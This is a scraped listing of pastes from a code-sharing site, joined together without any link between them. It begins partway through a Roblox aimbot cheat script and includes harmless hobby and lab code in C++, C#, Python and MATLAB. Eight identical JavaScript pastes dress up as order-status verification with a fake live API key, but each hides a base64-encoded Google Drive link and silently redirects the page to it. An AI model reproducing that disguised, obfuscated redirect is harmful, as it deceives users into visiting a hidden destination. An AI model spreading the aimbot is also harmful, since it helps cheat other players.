					mousemoverel((LockedPosition.X - GetMouseLocation(UserInputService).X) / Settings.Sensitivity2, (LockedPosition.Y - GetMouseLocation(UserInputService).Y) / Settings.Sensitivity2)
				else
					if Settings.Sensitivity > 0 then
						Animation = TweenService:Create(Camera, TweenInfonew(Environment.Settings.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFramenew(Camera.CFrame.Position, LockedPosition_Vector3)})
						Animation:Play()
					else
						__newindex(Camera, ""CFrame"", CFramenew(Camera.CFrame.Position, LockedPosition_Vector3 + Offset))
					end

					__newindex(UserInputService, ""MouseDeltaSensitivity"", 0)
				end

				setrenderproperty(FOVCircle, ""Color"", FOVSettings.LockedColor)
			end
		end
	end)

	ServiceConnections.InputBeganConnection = Connect(__index(UserInputService, ""InputBegan""), function(Input)
		local TriggerKey, Toggle = Settings.TriggerKey, Settings.Toggle

		if Typing then
			return
		end

		if Input.UserInputType == Enum.UserInputType.Keyboard and Input.KeyCode == TriggerKey or Input.UserInputType == TriggerKey then
			if Toggle then
				Running = not Running

				if not Running then
					CancelLock()
				end
			else
				Running = true
			end
		end
	end)

	ServiceConnections.InputEndedConnection = Connect(__index(UserInputService, ""InputEnded""), function(Input)
		local TriggerKey, Toggle = Settings.TriggerKey, Settings.Toggle

		if Toggle or Typing then
			return
		end

		if Input.UserInputType == Enum.UserInputType.Keyboard and Input.KeyCode == TriggerKey or Input.UserInputType == TriggerKey then
			Running = false
			CancelLock()
		end
	end)
end

--// Typing Check

ServiceConnections.TypingStartedConnection = Connect(__index(UserInputService, ""TextBoxFocused""), function()
	Typing = true
end)

ServiceConnections.TypingEndedConnection = Connect(__index(UserInputService, ""TextBoxFocusReleased""), function()
	Typing = false
end)

--// Functions

function Environment.Exit(self) -- METHOD | ExunysDeveloperAimbot:Exit(<void>)
	assert(self, ""EXUNYS_AIMBOT-V3.Exit: Missing parameter #1 \""self\"" <table>."")

	for Index, _ in next, ServiceConnections do
		Disconnect(ServiceConnections[Index])
	end

	Load = nil; ConvertVector = nil; CancelLock = nil; GetClosestPlayer = nil; GetRainbowColor = nil; FixUsername = nil

	self.FOVCircle:Remove()
	self.FOVCircleOutline:Remove()
	getgenv().ExunysDeveloperAimbot = nil
end

function Environment.Restart() -- ExunysDeveloperAimbot.Restart(<void>)
	for Index, _ in next, ServiceConnections do
		Disconnect(ServiceConnections[Index])
	end

	Load()
end

function Environment.Blacklist(self, Username) -- METHOD | ExunysDeveloperAimbot:Blacklist(<string> Player Name)
	assert(self, ""EXUNYS_AIMBOT-V3.Blacklist: Missing parameter #1 \""self\"" <table>."")
	assert(Username, ""EXUNYS_AIMBOT-V3.Blacklist: Missing parameter #2 \""Username\"" <string>."")

	Username = FixUsername(Username)

	assert(self, ""EXUNYS_AIMBOT-V3.Blacklist: User ""..Username.."" couldn't be found."")

	self.Blacklisted[#self.Blacklisted + 1] = Username
end

function Environment.Whitelist(self, Username) -- METHOD | ExunysDeveloperAimbot:Whitelist(<string> Player Name)
	assert(self, ""EXUNYS_AIMBOT-V3.Whitelist: Missing parameter #1 \""self\"" <table>."")
	assert(Username, ""EXUNYS_AIMBOT-V3.Whitelist: Missing parameter #2 \""Username\"" <string>."")

	Username = FixUsername(Username)

	assert(Username, ""EXUNYS_AIMBOT-V3.Whitelist: User ""..Username.."" couldn't be found."")

	local Index = tablefind(self.Blacklisted, Username)

	assert(Index, ""EXUNYS_AIMBOT-V3.Whitelist: User ""..Username.."" is not blacklisted."")

	tableremove(self.Blacklisted, Index)
end

function Environment.GetClosestPlayer() -- ExunysDeveloperAimbot.GetClosestPlayer(<void>)
	GetClosestPlayer()
	local Value = Environment.Locked
	CancelLock()

	return Value
end

Environment.Load = Load -- ExunysDeveloperAimbot.Load()

setmetatable(Environment, {__call = Load})

return Environment"
Lfnsxx6M,ESP32CAM_EDGE IMPULSE,rhandycan1,C++,Saturday 22nd of March 2025 06:07:10 AM CDT,"// include your library created here
#include <Wire.h>
#include <LiquidCrystal_I2C.h>
#include <eloquent_esp32cam.h>
#include <eloquent_esp32cam/edgeimpulse/fomo.h>


using eloq::camera;
using eloq::ei::fomo;

// Initialize the LCD (I2C address 0x27, 16 columns, 2 rows)
LiquidCrystal_I2C lcd(0x27, 16, 2);

void setup() {
    delay(3000);
    Serial.begin(115200);
    Serial.println(""__EDGE IMPULSE FOMO (NO-PSRAM)__"");
    
    // Initialize I2C LCD
    Wire.begin(14, 15);  // SDA = GPIO 14, SCL = GPIO 15
    lcd.init();
    lcd.backlight();
    lcd.setCursor(0, 0);
    lcd.print(""Initializing..."");

    // Camera settings
    camera.pinout.aithinker(); //replace aithinker with your model of your ESP32cam
    camera.brownout.disable();
    camera.resolution.yolo();
    camera.pixformat.rgb565();

    // Initialize camera
    while (!camera.begin().isOk()) {
        Serial.println(camera.exception.toString());
        lcd.setCursor(0, 1);
        lcd.print(""Cam Error!"");
    }

    Serial.println(""Camera OK"");
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print(""Ready!"");
}

void loop() {
    // Capture picture
    if (!camera.capture().isOk()) {
        Serial.println(camera.exception.toString());
        lcd.setCursor(0, 1);
        lcd.print(""Capture Failed"");
        return;
    }

    // Run FOMO inference
    if (!fomo.run().isOk()) {
        Serial.println(fomo.exception.toString());
        lcd.setCursor(0, 1);
        lcd.print(""Inference Error"");
        return;
    }

    // Display number of detected objects
    Serial.printf(""Found %d object(s) in %dms\n"", fomo.count(), fomo.benchmark.millis());
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.printf(""Objects: %d"", fomo.count());

    // If no objects detected, return
    if (!fomo.foundAnyObject()) {
        lcd.setCursor(0, 1);
        lcd.print(""No object found"");
        return;
    }

    // Display detected object
    lcd.setCursor(0, 1);
    lcd.printf(""%s"", fomo.first.label);
    Serial.printf(""Found %s at (x = %d, y = %d) (size %d x %d). Proba: %.2f\n"", 
                  fomo.first.label, fomo.first.x, fomo.first.y, 
                  fomo.first.width, fomo.first.height, fomo.first.proba);
}"
5GF0DyMm,Untitled,AdamBomb1116,JavaScript,Saturday 22nd of March 2025 06:07:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/154/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tSU6K0Cy,Dni z if,Cassimus,C#,Saturday 22nd of March 2025 05:59:02 AM CDT,"System.Console.WriteLine(""Podaj numer dnia tygodnia(1-7), a ja ci powiem jaki to dzień"");
short dzien = short.Parse(Console.ReadLine());

if (dzien == 1)
{
    System.Console.WriteLine($""{dzien} dzień tygodnia to poniedziałek"");
}
else if (dzien == 2)
{
    System.Console.WriteLine($""{dzien} dzień tygodnia to wtorek"");
}
else if (dzien == 3)
{
    System.Console.WriteLine($""{dzien} dzień tygodnia to środa"");
}
else if (dzien == 4)
{
    System.Console.WriteLine($""{dzien} dzień tygodnia to czwartek"");
}
else if (dzien == 5)
{
    System.Console.WriteLine($""{dzien} dzień tygodnia to piątek"");
}
else if (dzien == 6)
{
    System.Console.WriteLine($""{dzien} dzień tygodnia to sobota"");
}
else if (dzien == 7)
{
    System.Console.WriteLine($""{dzien} dzień tygodnia to niedziela"");
}
else
{
    System.Console.WriteLine(""Nieprawidlowy numer dnia tygodnia"");
}

"
xqCuxh05,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 05:55:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/057/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iVCg82SV,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 05:50:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/669/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1ArNgC7x,draw_waves,Korotkodul,Python,Saturday 22nd of March 2025 05:49:44 AM CDT,"from functools import partial

import matplotlib.pyplot as plt
import numpy as np

from IPython.display import HTML
from matplotlib.animation import FuncAnimation
plt.style.use(""ggplot"")


figure, axis = plt.subplots(figsize=(9, 9))
axis: plt.Axes
axis.set_xlim(-4.5, 4.5)
axis.set_ylim(-4.5, 4.5)

class FrameUpdater:
    def __init__(
        self,
        axis: plt.Axes,
        limit: float,
        frequency: int,
    ) -> None:
        self.axis = axis
        self.limit = limit
        self.frequency = frequency
        self.waves: list[plt.Circle] = []
        self.add_wave()
    
    def __call__(self, frame_id: int) -> list[plt.Circle]:
        if frame_id == 0:
          return self.waves

        new_waves = []
        for wave in self.waves:
          wave.set_radius(wave.radius + 0.1)

          if wave.radius > self.limit:
            wave.remove()
          else:
            new_waves.append(wave)

        self.waves = new_waves

        if frame_id % self.frequency == 0:
          self.add_wave()

        return self.waves 

    def add_wave(self):
        wave = plt.Circle((0, 0), 0, fill=False, lw=2, color = 'b')
        self.axis.add_patch(wave)
        self.waves.append(wave)

animation = FuncAnimation(
    figure,
    FrameUpdater(
        axis=axis,
        limit=4.5,
        frequency=10,
    ),
    frames=100,
    interval=50,
    blit=True,
)

HTML(animation.to_jshtml())"
wNbCQyh4,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 05:45:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/484/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NC3X2Jzy,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 05:34:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/127/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4Gpt3JEt,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 05:29:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/112/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uNFcEnP7,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 05:23:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/671/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ajkr5AiC,Lab 1a raman,314K,MatLab,Saturday 22nd of March 2025 05:21:04 AM CDT,"% clear
% close all
clc

%%

labels{1} = '30 sec, 20 ml/min';
labels{2} = '30 sec, 30 ml/min';
labels{3} = '30 sec, 40 ml/min';
labels{4} = '120 sec, 20 ml/min';

data{1} = load('0.5min_20ml.txt');
data{2} = load('0.5min_30ml.txt');
data{3} = load('0.5min_40ml.txt');
data{4} = load('2min_20ml.txt');

faint = 0.25;
clr_f{1} = [0.6350 0.0780 0.1840 faint];
clr_f{2} = [0.4660 0.6740 0.1880 faint];
clr_f{3} = [0 0.4470 0.7410 faint];
clr_f{4} = [0.4940 0.1840 0.5560 faint];

% data_smooth = cell(1,4);
% for i = 1:length(data)
%     x = data{i}(:,1);
%     y = data{i}(:,2);
%     yy = smooth(y,'rlowess')
%     data_smooth{i} = yy;
% end

clr{1} = [0.6350 0.0780 0.1840];
clr{2} = [0.4660 0.6740 0.1880];
clr{3} = [0 0.4470 0.7410];
clr{4} = [0.4940 0.1840 0.5560];


figure

val_range{1} = [100 240];
val_range{2} = [1250 1400];
val_range{3} = [1540 1640];
val_range{4} = [2500 2750];
span = [0.1 0.5 0.1 0.4];
ylims{1} = [40 140];
ylims{2} = [40 90];
ylims{3} = [0 400];
ylims{4} = [40 100];

for i = 1:length(val_range)
    A = find(data{i}(:,1) >= val_range{i}(1), 1);
    B = find(data{i}(:,1) >= val_range{i}(2), 1);
    ind_range{i} = [A:B];
end

% 
% fit_types = ['gauss2' 'gauss1' 'gauss3' 'gauss1'];

for i = 1:length(data)
    
    subplot(2,length(val_range),[1:length(val_range)])
    hold on
    grid on
    plot(data{i}(:,1),data{i}(:,2),'-','color',clr{i})
    xlabel('wavenumber, cm^{-1}')
    ylabel('intensity, a.u.')
    legend(labels)
    ftype()
    
    for j = 1:length(val_range)
        subplot(2,length(val_range),length(val_range)+j)
        [x1,y1,yy1] = smoother(data{i},ind_range{j},span(j));
        hold on
        grid on
        plot(x1,y1,'color',clr_f{i})
        plot(x1,yy1,'color',clr{i},'Linewidth',2)
        xlim(val_range{j})
        xlabel('wavenumber, cm^{-1}')
        ylabel('intensity, a.u.')
        ylim(ylims{j})
        ftype()
    end

%     for j = 1:length(val_range)
%         subplot(2,length(val_range),length(val_range)+j)
%         hold on
%         grid on
%         [x1,y1,yy1] = fitter(data{i},ind_range{j},fit_types(j));
%         xlim(val_range{j})
%         xlabel('wavenumber, cm^{-1}')
%         ylabel('intensity, a.u.')
%         ftype()
%     end
    
%     subplot(2,4,5)
%     [x1,y1,yy1] = smoother(data{i},ind_range{1});
%     hold on
%     grid on
%     plot(x1,y1,'color',clr_f{i})
%     plot(x1,yy1,'color',clr{i})
%     xlim(val_range{1})
%     xlabel('wavenumber, cm^{-1}')
%     ylabel('intensity, a.u.')
%     
%     subplot(2,4,6)
%     [x,y,yy] = smoother(data{i},ind_range{2});
%     hold on
%     grid on
%     plot(x,y,'color',clr_f{i})
%     plot(x,yy,'color',clr{i})
%     xlim(val_range{2})
%     xlabel('wavenumber, cm^{-1}')
%     ylabel('intensity, a.u.')
%     
%     subplot(2,4,7)
%     [x,y,yy] = smoother(data{i},ind_range{3});
%     hold on
%     grid on
%     plot(x,y,'color',clr_f{i})
%     plot(x,yy,'color',clr{i})
%     xlim(val_range{3})
%     xlabel('wavenumber, cm^{-1}')
%     ylabel('intensity, a.u.')
%     
%     subplot(2,4,8)
%     [x,y,yy] = smoother(data{i},ind_range{4});
%     hold on
%     grid on
%     plot(x,y,'color',clr_f{i})
%     plot(x,yy,'color',clr{i})
%     xlim(val_range{4})
%     xlabel('wavenumber, cm^{-1}')
%     ylabel('intensity, a.u.')
end


%%

function [x,y,yy] = smoother(data,range,span);
x = data(range,1);
y = data(range,2);
yy = smooth(y,span,'loess');
end

function [x,y,yy] = fitter(data,range,degree)

faint = 0.25;
clr_f{1} = [0.6350 0.0780 0.1840 faint];
clr_f{2} = [0.4660 0.6740 0.1880 faint];
clr_f{3} = [0 0.4470 0.7410 faint];
clr_f{4} = [0.4940 0.1840 0.5560 faint];

clr{1} = [0.6350 0.0780 0.1840];
clr{2} = [0.4660 0.6740 0.1880];
clr{3} = [0 0.4470 0.7410];
clr{4} = [0.4940 0.1840 0.5560];

x = data(range,1);
y = data(range,2);
F = fit(x,y,degree);

plot(x,y,'color',clr_f{i})
plot(F,x,y,'color',clr{i})
end

function ftype()
set(gca,'FontSize',13,'fontWeight','bold')
set(findall(gcf,'type','text'),'FontSize',13,'fontWeight','bold')
end


"
pMDr82pp,Lab 1b raman,314K,MatLab,Saturday 22nd of March 2025 05:20:11 AM CDT,"clear
close all
clc

%%

labels{1} = 'pristine';
labels{2} = 'gold-doped';
labels{3} = 'platinum-doped';

data{1} = load('pris.txt');
data{2} = load('Au.txt');
data{3} = load('Pt.txt');

faint = 0.25;
clr_f{1} = [0.6350 0.0780 0.1840 faint];
clr_f{2} = [0.4660 0.6740 0.1880 faint];
clr_f{3} = [0 0.4470 0.7410 faint];
clr_f{4} = [0.4940 0.1840 0.5560 faint];

% data_smooth = cell(1,4);
% for i = 1:length(data)
%     x = data{i}(:,1);
%     y = data{i}(:,2);
%     yy = smooth(y,'rlowess')
%     data_smooth{i} = yy;
% end

clr{1} = [0.6350 0.0780 0.1840];
clr{2} = [0.4660 0.6740 0.1880];
clr{3} = [0 0.4470 0.7410];
clr{4} = [0.4940 0.1840 0.5560];


figure

val_range{1} = [100 240];
val_range{2} = [1250 1400];
val_range{3} = [1540 1640];
val_range{4} = [2500 2750];
span = [0.05 0.5 0.25 0.4];

ylims{1} = [40 140];
ylims{2} = [40 90];
ylims{3} = [0 400];
ylims{4} = [40 100];


for i = 1:length(val_range)
    A = find(data{1}(:,1) >= val_range{i}(1), 1);
    B = find(data{1}(:,1) >= val_range{i}(2), 1);
    ind_range{i} = [A:B];
end
for i = 1:length(data)
    
    subplot(2,length(val_range),[1:length(val_range)])
    hold on
    grid on
    plot(data{i}(:,1),data{i}(:,2),'-','color',clr{i})
    xlabel('wavenumber, cm^{-1}')
    ylabel('intensity, a.u.')
    legend(labels)
    ftype()
    ylim([0 400])
    
    for j = 1:length(val_range)
        subplot(2,length(val_range),length(val_range)+j)
        [x1,y1,yy1] = smoother(data{i},ind_range{j},span(j));
        hold on
        grid on
        plot(x1,y1,'color',clr_f{i})
        plot(x1,yy1,'color',clr{i},'Linewidth',2)
        xlim(val_range{j})
        xlabel('wavenumber, cm^{-1}')
        ylabel('intensity, a.u.')
        ylim(ylims{j})
        ftype()
    end

%     for j = 1:length(val_range)
%         subplot(2,length(val_range),length(val_range)+j)
%         hold on
%         grid on
%         [x1,y1,yy1] = fitter(data{i},ind_range{j},fit_types(j));
%         xlim(val_range{j})
%         xlabel('wavenumber, cm^{-1}')
%         ylabel('intensity, a.u.')
%         ftype()
%     end
    
%     subplot(2,4,5)
%     [x1,y1,yy1] = smoother(data{i},ind_range{1});
%     hold on
%     grid on
%     plot(x1,y1,'color',clr_f{i})
%     plot(x1,yy1,'color',clr{i})
%     xlim(val_range{1})
%     xlabel('wavenumber, cm^{-1}')
%     ylabel('intensity, a.u.')
%     
%     subplot(2,4,6)
%     [x,y,yy] = smoother(data{i},ind_range{2});
%     hold on
%     grid on
%     plot(x,y,'color',clr_f{i})
%     plot(x,yy,'color',clr{i})
%     xlim(val_range{2})
%     xlabel('wavenumber, cm^{-1}')
%     ylabel('intensity, a.u.')
%     
%     subplot(2,4,7)
%     [x,y,yy] = smoother(data{i},ind_range{3});
%     hold on
%     grid on
%     plot(x,y,'color',clr_f{i})
%     plot(x,yy,'color',clr{i})
%     xlim(val_range{3})
%     xlabel('wavenumber, cm^{-1}')
%     ylabel('intensity, a.u.')
%     
%     subplot(2,4,8)
%     [x,y,yy] = smoother(data{i},ind_range{4});
%     hold on
%     grid on
%     plot(x,y,'color',clr_f{i})
%     plot(x,yy,'color',clr{i})
%     xlim(val_range{4})
%     xlabel('wavenumber, cm^{-1}')
%     ylabel('intensity, a.u.')
end


%%

function [x,y,yy] = smoother(data,range,span);
x = data(range,1);
y = data(range,2);
yy = smooth(y,span,'loess');
end
%{
function [x,y,yy] = fitter(data,range,degree)

faint = 0.25;
clr_f{1} = [0.6350 0.0780 0.1840 faint];
clr_f{2} = [0.4660 0.6740 0.1880 faint];
clr_f{3} = [0 0.4470 0.7410 faint];
clr_f{4} = [0.4940 0.1840 0.5560 faint];

clr{1} = [0.6350 0.0780 0.1840];
clr{2} = [0.4660 0.6740 0.1880];
clr{3} = [0 0.4470 0.7410];
clr{4} = [0.4940 0.1840 0.5560];

x = data(range,1);
y = data(range,2);
F = fit(x,y,degree);

plot(x,y,'color',clr_f{i})
plot(F,x,y,'color',clr{i})
end
%}

function ftype()
set(gca,'FontSize',13,'fontWeight','bold')
set(findall(gcf,'type','text'),'FontSize',13,'fontWeight','bold')
end


"
z9heurvg,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 05:18:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/568/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UD8Sj886,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 05:12:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/905/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
f8nLcuBw,Lab 2b - gas sensor,314K,MatLab,Saturday 22nd of March 2025 05:09:04 AM CDT,"clear
close all
clc
    % PROCESS_GRAPHENE_DATA
    % 1) Loads data (time, R, concentration)
    % 2) Splits data into on/off intervals
    % 3) Fits 'on' intervals with a log function
    % 4) Fits 'off' intervals with an exponential function
    % 5) Stores results in a cell array and plots them

    %% 1. Load data
    % data.txt must contain columns: time(sec), resistance(Ohm), concentration(ppm)
    data = load('data.txt'); 
    t = data(:,1)./1;    % time in seconds (or use t/60 if you prefer minutes)
    R = data(:,2)./1000;    % resistance
    C = data(:,3);    % concentration

    %% 2. Identify gas ""on"" vs. ""off"" intervals
    onThreshold = 0.1;      % user-defined threshold for ""gas on"" 
    gasOn = (C > onThreshold);

    % Find indices where we transition from on->off or off->on
    switchPoints = find(diff(gasOn) ~= 0);

    % We'll store intervals in a cell array. Each element is a struct with:
    %   startIndex, endIndex, isOn
    intervals = {};
    startIdx = 1;
    currentState = gasOn(1);

    for i = 1:length(switchPoints)
        endIdx = switchPoints(i);
        intervals{end+1} = struct('startIndex', startIdx, ...
                                  'endIndex',   endIdx, ...
                                  'isOn',       currentState);
        % Next interval will begin after the switch
        startIdx = endIdx + 1;
        currentState = ~currentState;
    end
    % The last interval goes from startIdx to the end of the data
    if startIdx <= length(t)
        intervals{end+1} = struct('startIndex', startIdx, ...
                                  'endIndex',   length(t), ...
                                  'isOn',       currentState);
    end

    %% 3. Prepare a cell array to store fits
    % We'll store, for each interval k:
    %   fits{k}.type       = 'growth' or 'decay'
    %   fits{k}.startIndex
    %   fits{k}.endIndex
